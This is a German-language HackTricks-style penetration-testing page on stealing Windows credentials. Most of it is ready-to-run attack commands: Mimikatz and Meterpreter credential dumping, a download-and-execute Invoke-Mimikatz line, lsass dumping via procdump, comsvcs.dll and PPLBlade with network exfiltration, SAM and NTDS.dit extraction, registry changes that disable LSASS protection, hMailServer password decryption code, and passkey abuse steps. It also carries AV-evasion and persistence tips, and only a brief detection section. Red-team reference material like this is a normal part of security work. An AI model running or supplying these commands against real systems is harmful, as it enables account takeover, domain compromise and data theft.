# Windows-Anmeldedaten stehlen

{{#include ../../banners/hacktricks-training.md}}

## Anmeldedaten mit Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde weitere Dinge, die Mimikatz auf** [**dieser Seite**](credentials-mimikatz.md)** kann.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Hier erfahren Sie mehr über einige mögliche Schutzmaßnahmen für Credentials.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten Mimikatz daran hindern, einige Credentials zu extrahieren.**

## Credentials with Meterpreter

Verwenden Sie das von mir erstellte [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), um **Passwörter und Hashes** auf dem Opfer zu **suchen**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Du kannst dieses Tool verwenden, um den **lsass-Prozess zu dumpen**, den **Dump herunterzuladen** und die **Credentials lokal** aus dem Dump zu **extrahieren**.

Du könntest auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** könnten die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig erkennen**, da sie die Zeichenfolge **"procdump.exe" und "lsass.exe"** **erkennen**. Daher ist es **unauffälliger**, die **PID** von lsass.exe als **Argument** an procdump zu übergeben, **anstatt** des **Namens lsass.exe.**

### Dumping lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist dafür verantwortlich, im Falle eines Absturzes den **Prozessspeicher zu dumpen**. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden kann.\
Die Verwendung der ersten beiden Argumente ist irrelevant, das dritte Argument ist jedoch in drei Komponenten unterteilt. Die Prozess-ID des zu dumpenden Prozesses bildet die erste Komponente, der Speicherort der Dump-Datei stellt die zweite dar, und die dritte Komponente ist ausschließlich das Wort **full**. Es gibt keine alternativen Optionen.\
Nach dem Parsen dieser drei Komponenten wird die DLL mit der Erstellung der Dump-Datei und der Übertragung des Speichers des angegebenen Prozesses in diese Datei beauftragt.\
Die Verwendung von **comsvcs.dll** ist zum Dumpen des lsass-Prozesses möglich, wodurch das Hochladen und Ausführen von procdump entfällt. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.<sup>[[9]](#references)</sup>

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Diesen Prozess kannst du mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **lsass mit dem Task Manager dumpen**

1. Klicke mit der rechten Maustaste auf die Taskleiste und klicke auf Task-Manager
2. Klicke auf Weitere Details
3. Suche im Tab Prozesse nach dem Prozess "Local Security Authority Process"
4. Klicke mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und klicke auf "Create dump file".

### lsass mit procdump dumpen

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binary, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das die Obfuskierung von Memory-Dumps und deren Übertragung auf Remote-Workstations unterstützt, ohne sie auf der Festplatte abzulegen.

**Wichtige Funktionen**:

1. Umgehen des PPL-Schutzes
2. Obfuskieren von Memory-Dump-Dateien, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Hochladen von Memory-Dumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless Dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-basiertes LSASS-Dumping ohne MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, sodass EDR-Hooks auf dieser API nie ausgelöst werden:<sup>[[3]](#references)</sup>

1. **Stage 1 Loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter aus 32 Kleinbuchstaben `d`, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 innerhalb von LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, führt mit jedem Byte eine XOR-Operation mit `0x20` durch und mappt den decodierten Blob in den Speicher, bevor die Ausführung übertragen wird.
3. **Stage 3 Dumper** – der gemappte Payload implementiert die MiniDump-Logik mithilfe von **direct syscalls** neu, die aus gehashten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, damit die Exfiltration später erfolgen kann.

Hinweise für Operatoren:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 ersetzt den fest codierten Platzhalter durch den absoluten Pfad zu `rtu.txt`; wenn du sie trennst, wird die Kette unterbrochen.
* Die Registrierung erfolgt, indem `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` angehängt wird. Du kannst diesen Wert selbst setzen, damit LSASS den SSP bei jedem Bootvorgang erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie anschließend an Mimikatz/Volatility zur Extraktion von Credentials.
* Für die Ausführung von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist. Sobald der Aufruf zurückkehrt, lädt LSASS den Rogue-SSP transparent und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte entfernt sie nicht aus LSASS. Lösche entweder den Registry-Eintrag und starte LSASS neu (Neustart) oder belasse ihn für langfristige Persistence.

## CrackMapExec

### SAM-Hashes auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Secrets dumpen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit vom Ziel-DC dumpen
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the Kennworthistorie von NTDS.dit vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Das pwdLastSet-Attribut für jedes NTDS.dit-Konto anzeigen
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM stehlen

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ befinden. Du kannst sie jedoch **nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Am einfachsten lassen sich diese Dateien stehlen, indem du eine Kopie aus der Registry abrufst:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die Hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volumeschattenkopie

Mit diesem Dienst können Sie Kopien geschützter Dateien erstellen. Sie müssen Administrator sein.

#### Mit vssadmin

Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber du kannst dasselbe auch über **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist „C:“ und sie wird unter C:\users\Public gespeichert), aber du kannst dies zum Kopieren jeder geschützten Datei verwenden:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich könntest du auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die Datei **NTDS.dit** ist als das Herzstück von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. In ihr werden die **password hashes** der Domain-Benutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei primäre Tabellen verwaltet:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie verfolgt Beziehungen wie Gruppenmitgliedschaften.
- **SD Table**: Hier werden die **Security descriptors** für jedes Objekt gespeichert, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Christoffer Anderssons Forschung zur Datenbankebene dokumentiert diese Tabellen und ihr versionsspezifisches Verhalten ausführlicher.<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Daher kann sich ein **Teil** der Datei **NTDS.dit** **im Speicher von `lsass`** befinden (dort finden sich wahrscheinlich die zuletzt aufgerufenen Daten, da die Performance durch die Verwendung eines **cache** verbessert wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mithilfe des **BOOTKEY** und **RC4** entschlüsseln.
2. Den **hash** mithilfe des **PEK** und **RC4** entschlüsseln.
3. Den **hash** mithilfe von **DES** entschlüsseln.

Der **PEK** hat auf jedem Domain Controller denselben Wert, ist jedoch innerhalb von **NTDS.dit** mit dem DC-spezifischen **BOOTKEY** aus dem **SYSTEM**-Hive dieses Domain Controllers verschlüsselt. Daher sind zum Extrahieren von Credentials sowohl **NTDS.dit** als auch **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) erforderlich.

### NTDS.dit mit Ntdsutil kopieren

Seit Windows Server 2008 verfügbar.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Du könntest auch den [**volume shadow copy**](#stealing-sam-and-system)-Trick verwenden, um die Datei **ntds.dit** zu kopieren. Denke daran, dass du außerdem eine Kopie der **SYSTEM-Datei** benötigst (sie erneut [**aus der Registry dumpen oder den volume shadow copy**](#stealing-sam-and-system)-Trick verwenden).

### **Hashes aus NTDS.dit extrahieren**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **erhalten** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Du kannst sie auch **automatisch extrahieren**, indem du einen gültigen Domain-Admin-Benutzer verwendest:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **Metasploit-Modul**: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Domänenobjekte aus NTDS.dit in eine SQLite-Datenbank extrahieren**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Geheimnisse extrahiert, sondern auch die vollständigen Objekte und ihre Attribute, um weitere Informationen zu extrahieren, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Der `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Secrets (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Trust-Keys sowie NT- und LM-Passworthistorien). Zusammen mit weiteren Informationen werden folgende Daten extrahiert: Benutzer- und Computerkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPNs, SPNs, Gruppen und rekursive Mitgliedschaften, die Struktur und Mitgliedschaft der Organisationseinheiten, vertrauenswürdige Domänen mit Trust-Typ, Richtung und Attributen ...

## Lazagne

Lade die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Du kannst diese Binärdatei verwenden, um Credentials aus verschiedenen Softwareprogrammen zu extrahieren.
```
lazagne.exe all
```
## Andere Tools zum Extrahieren von Credentials aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um Credentials aus dem Speicher zu extrahieren. Lade es herunter unter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiere Credentials aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Anmeldedaten aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Lade es von [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) herunter und **führe es einfach aus**; die Passwörter werden extrahiert.

## Leerlaufende RDP-Sitzungen auswerten und Sicherheitskontrollen schwächen

Ink Dragons FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### Telemetriesammlung im Stil von DumpRDPHistory

* **Ausgehende RDP-Ziele** – parse jeden Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst die Logik von FinalDraft mit PowerShell nachbilden:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Belege für eingehende RDP-Verbindungen** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Event-IDs **21** (erfolgreiche Anmeldung) und **25** (Verbindungstrennung) ab, um zu ermitteln, wer den Rechner administriert hat:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sobald du weißt, welcher Domain Admin regelmäßig eine Verbindung herstellt, kannst du LSASS (mit LalsDumper/Mimikatz) auslesen, solange dessen **getrennte** Sitzung noch besteht. CredSSP + NTLM fallback hinterlässt dessen Verifier und Tokens in LSASS, die anschließend über SMB/WinRM wiederverwendet werden können, um `NTDS.dit` zu stehlen oder Persistenz auf Domain Controllern einzurichten.

### Von FinalDraft gezielte Registry-Herabstufungen

Dasselbe Implantat manipuliert außerdem mehrere Registry-Schlüssel, um den Diebstahl von Zugangsdaten zu erleichtern:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Anmeldedaten/Tickets während RDP und ermöglicht Pass-the-Hash-ähnliche Pivoting-Angriffe.
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Token-Filterung, sodass lokale Administratoren uneingeschränkte Tokens über das Netzwerk erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht es dem DSRM-Administrator, sich anzumelden, während der DC online ist, und gibt Angreifern dadurch ein weiteres integriertes Konto mit hohen Berechtigungen.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz und macht den Speicherzugriff für Dumper wie LalsDumper trivial.

## hMailServer-Datenbankanmeldedaten (nach einer Kompromittierung)

hMailServer speichert das Datenbankpasswort in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` unter `[Database] Password=`. Der Wert ist mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` sowie mit 4-Byte-Word-Endianness-Vertauschungen Blowfish-verschlüsselt. Verwende den Hex-String aus der INI-Datei mit diesem Python-Snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mit dem Klartextpasswort die SQL-CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf ein Upgrade durchführen, bevor die Hashes abgefragt werden:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die Spalte `accountpassword` verwendet das hMailServer-Hash-Format (hashcat-Modus `1421`). Das Knacken dieser Werte kann wiederverwendbare Zugangsdaten für WinRM/SSH-Pivots liefern.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bestimmte Tools erfassen **Klartext-Anmeldepasswörter**, indem sie den LSA-Logon-Callback `LsaApLogonUserEx2` abfangen. Dabei wird der Authentication-Package-Callback gehookt oder umschlossen, sodass Zugangsdaten **während des Logons** (vor dem Hashing) erfasst und anschließend auf die Festplatte geschrieben oder an den Operator zurückgegeben werden. Dies wird üblicherweise als Hilfsprogramm implementiert, das in LSA injiziert oder bei LSA registriert wird und anschließend jedes erfolgreiche interaktive oder Netzwerk-Logon-Ereignis mit Benutzername, Domäne und Passwort protokolliert.<sup>[[1]](#references)</sup>

Betriebshinweise:
- Erfordert lokale Administratorrechte oder SYSTEM, um das Hilfsprogramm in den Authentication Path zu laden.
- Erfasste Zugangsdaten erscheinen nur, wenn ein Logon erfolgt (interaktiver Logon, RDP-, Service- oder Netzwerk-Logon, abhängig vom Hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert Verbindungsinformationen in einer benutzerbezogenen `sqlstudio.bin`-Datei. Dedizierte Dumper können die Datei parsen und gespeicherte SQL-Zugangsdaten wiederherstellen. In Shells, die nur die Befehlsausgabe zurückgeben, wird die Datei häufig durch Base64-Kodierung exfiltriert und auf stdout ausgegeben.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Auf der Operator-Seite die Datei neu erstellen und den Dumper lokal ausführen, um Zugangsdaten wiederherzustellen:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Diebstahl von Passkeys-/WebAuthn-Anmeldedaten aus Chrome unter Windows

Wenn eine **Codeausführung** als **victim user** auf einem Windows-Host mit **Chrome + mit Google Password Manager synchronisierten Passkeys** erlangt wird, werden Passkeys zu einem interessanten **post-exploitation target**, selbst **ohne Admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** speichert protobuf-codierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **Benutzernamen**, die **Credential ID** und verschlüsseltes Material privater Schlüssel für synchronisierte Passkeys aufzählen.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den Status der lokalen Geräteanmeldung, z. B. **`wrapped_identity_private_key`** und das verpackte Geheimnis, das zur Wiederherstellung synchronisierter Credentials verwendet wird.<sup>[[4]](#references)</sup>

Schnelle Triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### An TPM gebundene Key-Blobs können weiterhin als lokale Signing Oracle missbraucht werden

Wenn der Browser einen auf dem TPM basierenden Identity Key als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und dieses Blob in einem für Benutzer zugänglichen Zustand speichert, muss Malware nicht den privaten Raw-Key extrahieren. Sie kann das Blob einfach auf der **derselben Maschine** erneut importieren und das lokale TPM auffordern, vom Angreifer kontrollierte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Dies bedeutet: **Hardware-Bindung verhindert den Export außerhalb des Geräts, nicht jedoch die Nutzung durch denselben Benutzer auf dem kompromittierten Endpunkt**.

### Praktische Missbrauchswege

1. **Pass-ta-key-/Device-Identity-Relay**<sup>[[4]](#references)</sup>
- `WebauthnCredentialSpecifics` aus Chromes LevelDB enumerieren.
- Einen Passkey-Login starten und eine neue WebAuthn-Challenge erhalten.
- Den gestohlenen Blob `wrapped_identity_private_key` auf dem TPM des Opfers verwenden, um die Cloud-Authenticator-Request-Bindung zu signieren.
- Die zurückgegebene Assertion an die Relying Party weiterleiten.
- Dies ist besonders wertvoll, wenn die RP `userVerification=preferred` akzeptiert oder es versäumt, Assertions mit **`UV=0`** abzulehnen.
2. **Hijacking eines ausstehenden UV-Keys**<sup>[[4]](#references)</sup>
- Ein erneutes Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültig signierte `device/forget`-Operation gesendet wird.
- Wenn das Onboarding das Gerät im Zustand **`uv_key_pending`** belässt, einen vom Angreifer kontrollierten öffentlichen UV-Key registrieren.
- Wenn der Provider die Attestation bzw. den Ursprung der sicheren Hardware für den neuen UV-Key nicht überprüft, werden spätere Signaturen des Angreifer-Keys als **`UV=1`** behandelt.
3. **Diebstahl des Master Secret / der SDS-Wiederherstellung**<sup>[[4]](#references)</sup>
- Eine Wiederherstellung oder einen erneuten Beitritt erzwingen, sodass Chrome das synchronisierte Passkey-Master-Secret abruft.
- Die Neuerstellung/Änderung von `passkey_enclave_state` überwachen und anschließend einen Dump des Chrome-Speichers erstellen, während das Klartext-**Security-Domain-Secret (SDS)** resident ist.
- Die wiederhergestellte SDS verwenden, um die verschlüsselten Felder in jedem `WebauthnCredentialSpecifics`-Datensatz zu entschlüsseln und portable WebAuthn-Private-Keys wiederherzustellen.

### DFIR-/Erkennungsideen

- **Löschung/Neuerstellung** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Bei ungewöhnlichem Zugriff nicht browserbasierter Prozesse auf Chromes **`Sync Data\LevelDB`** alarmieren.
- Bei **Chrome-Speicherabbildern** oder verdächtigem Cross-Process-Speicherzugriff alarmieren.
- Wiederholte Aufforderungen zur Eingabe der **Google Password Manager Recovery PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass WebAuthn-**`signCount`** bei synchronisierten Passkeys häufig nicht nützlich ist, da der Wert konstant bleiben kann; die klassische Clone-Erkennung ist daher schwach.

## References

- [1] [Unit 42 – Eine Untersuchung über jahrelang unentdeckte Operationen gegen Sektoren von hohem Wert](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Credentials → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Einblicke in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation aufgedeckt](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eine neuartige Angriffsfläche bei passwortloser Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-Key-Speicher](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows-Hacking: Angriffe auf Microsoft-Systeme und -Netzwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
